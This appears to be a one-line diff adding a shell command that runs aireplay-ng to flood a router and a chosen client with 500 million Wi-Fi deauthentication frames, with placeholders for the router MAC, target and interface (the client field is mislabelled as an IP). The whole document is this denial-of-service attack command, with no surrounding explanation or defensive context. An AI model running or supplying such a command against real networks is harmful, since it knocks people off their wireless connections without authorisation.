@@ -1,0 +1,2 @@
+sudo aireplay-ng --deauth 500000000 -a #RouterMAC -c #TargetIP #Interface
+
